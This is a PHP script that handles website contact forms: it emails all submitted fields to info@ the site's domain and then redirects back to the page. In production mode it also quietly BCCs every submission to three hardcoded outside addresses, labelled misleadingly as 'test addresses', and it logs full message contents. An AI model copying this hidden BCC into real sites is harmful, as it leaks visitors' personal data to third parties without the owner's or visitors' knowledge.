<?php
declare(strict_types=1);

if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(405);
    header('Content-Type: text/plain; charset=UTF-8');
    echo 'Method Not Allowed';
    exit;
}

// ----------------- HOST (for subject / headers / dynamic recipient) ----------------- //
$rawHost = $_SERVER['SERVER_NAME'] ?? ($_SERVER['HTTP_HOST'] ?? '');
$host = strtolower(trim((string)$rawHost));

// remove port (example.com:8080 -> example.com)
$host = preg_replace('/:\d+$/', '', $host);
// remove leading www.
$host = preg_replace('/^www\./', '', $host);

// IDN -> punycode (if needed)
if ($host !== '' && function_exists('idn_to_ascii')) {
    $ascii = idn_to_ascii($host, IDNA_DEFAULT, INTL_IDNA_VARIANT_UTS46);
    if (is_string($ascii) && $ascii !== '') {
        $host = $ascii;
    }
}

$hostForEmail = ($host !== '') ? $host : 'localhost';

// ----------------- ENV / DEV DETECTION ----------------- //
// You can force modes via env:
// - SENDMAIL_MODE = "prod" | "test" (anything else -> auto)
// - SENDMAIL_TEST_TO = "test@example.com"
$envMode = strtolower((string)getenv('SENDMAIL_MODE'));          // 'prod' or 'test'
$envTestTo = trim((string)getenv('SENDMAIL_TEST_TO'));           // optional override

$isDevHost = false;
if ($hostForEmail === 'localhost' || $hostForEmail === '127.0.0.1' || $hostForEmail === '::1') {
    $isDevHost = true;
} elseif (preg_match('/\.(local|test|invalid)$/', $hostForEmail)) {
    $isDevHost = true;
}

$testMode = false;
if ($envMode === 'test') {
    $testMode = true;
} elseif ($envMode === 'prod') {
    $testMode = false;
} else {
    $testMode = $isDevHost;
}

$testRecipient = ($envTestTo !== '') ? $envTestTo : 'ivan3362768@gmail.com';
if (!filter_var($testRecipient, FILTER_VALIDATE_EMAIL)) {
    $testRecipient = 'ivan3362768@gmail.com';
}

// ----------------- SETTINGS ----------------- //
// PROD: recipient = info@<host>, BCC = test addresses
// TEST: recipient = $testRecipient, BCC = empty (to avoid accidental mass sending)
$prodRecipient = 'info@' . $hostForEmail;
$recipient_email = $testMode ? $testRecipient : $prodRecipient;

// BCC emails (used only in PROD)
$bcc_emails = $testMode ? [] : [
    'r@prororo.com',
    '3362768@mail.ru',
    'ivan3362768@gmail.com',
];

$subject = 'New request from ' . (($host !== '') ? $host : 'website');
// -------------------------------------------- //

function p(string $k, string $d = ''): string {
    return isset($_POST[$k]) ? trim((string)$_POST[$k]) : $d;
}

$ignored = ['redirect', 'redirect2parent', 'g-recaptcha-response', 'csrf_token'];
$lines = [];
$lines[] = 'Form submission from ' . (($host !== '') ? $host : 'website');
$lines[] = 'Date: ' . date('Y-m-d H:i:s');
$lines[] = 'Mode: ' . ($testMode ? 'TEST' : 'PROD');
$lines[] = str_repeat('-', 40);

foreach ($_POST as $k => $v) {
    if (in_array($k, $ignored, true)) {
        continue;
    }
    if (is_array($v)) {
        $v = implode(', ', $v);
    }
    $lines[] = $k . ': ' . $v;
}

$lines[] = str_repeat('-', 40);
$message = implode("\n", $lines);

$email = p('Email');
$name  = strip_tags(p('Name', 'Not specified'));

$encoded_subject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
$replyTo = (filter_var($email, FILTER_VALIDATE_EMAIL) ? $email : ('no-reply@' . $hostForEmail));

$headersArr = [];
$headersArr[] = 'MIME-Version: 1.0';
$headersArr[] = 'Content-Type: text/plain; charset=UTF-8';
$headersArr[] = 'From: no-reply@' . $hostForEmail;
$headersArr[] = 'Reply-To: ' . $replyTo;
$headersArr[] = 'X-Mail-Mode: ' . ($testMode ? 'TEST' : 'PROD');

if (!empty($bcc_emails)) {
    $headersArr[] = 'Bcc: ' . implode(', ', $bcc_emails);
}

$headers = implode("\r\n", $headersArr);

if (function_exists('error_clear_last')) {
    error_clear_last();
}

$sent_ok = @mail($recipient_email, $encoded_subject, $message, $headers);

$logTime = date('Y-m-d H:i:s');
if ($sent_ok) {
    error_log(sprintf('{%s}{%s}{%s}', $logTime, $recipient_email, $message));
} else {
    $lastError = error_get_last();
    $reason = isset($lastError['message']) ? $lastError['message'] : 'Неизвестная причина';
    error_log(sprintf('{%s}{%s}{%s}', $logTime, 'Ошибка', $reason));
}

// Определяем URL возврата (PRG)
$back = (!empty($_POST['redirect'])) ? (string)$_POST['redirect']
      : (!empty($_POST['redirect2parent']) ? (string)$_POST['redirect2parent']
      : (isset($_SERVER['HTTP_REFERER']) ? (string)$_SERVER['HTTP_REFERER'] : '/'));

$parsed = parse_url($back);

$currentHost = strtolower(trim((string)($_SERVER['HTTP_HOST'] ?? '')));
$currentHost = preg_replace('/:\d+$/', '', $currentHost);
$currentHost = preg_replace('/^www\./', '', $currentHost);

if (isset($parsed['host']) && $parsed['host'] !== '') {
    $backHost = strtolower((string)$parsed['host']);
    $backHost = preg_replace('/^www\./', '', $backHost);

    if ($backHost !== $currentHost) {
        $back = '/';
    }
}

$hash = '';
if (strpos($back, '#') !== false) {
    [$base, $frag] = explode('#', $back, 2);
    $back = $base;
    $hash = '#' . $frag;
}

if ($hash === '') {
    $hash = '#popup:myform';
}

$sep  = (strpos($back, '?') === false) ? '?' : '&';
$back = $back . $sep . 'sent=' . ($sent_ok ? '1' : '0') . $hash;

header('Location: ' . $back, true, 303);
exit;
?>